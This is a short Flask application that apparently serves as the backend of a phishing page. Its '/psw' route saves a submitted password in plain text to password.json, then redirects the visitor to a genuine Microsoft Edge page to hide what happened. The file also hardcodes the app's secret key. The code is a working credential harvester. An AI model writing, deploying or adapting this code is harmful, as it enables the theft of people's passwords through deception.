from flask import Flask, render_template, request, redirect, url_for, make_response
import json
app = Flask(__name__)
app.secret_key = "|\|||<|-|||_"

@app.route('/', methods=['GET', 'POST'])
def home():
    return render_template('home.html')

@app.route('/psw', methods=['POST'])
def home2():
    with open('password.json') as help:
        jfile = json.load(help)
        jfile['psw'] = request.form['psw']
        with open('password.json', 'w') as help2:
            json.dump(jfile, help2)
    return redirect("https://www.microsoft.com/en-us/edge?exp=e00&form=MA13FJ")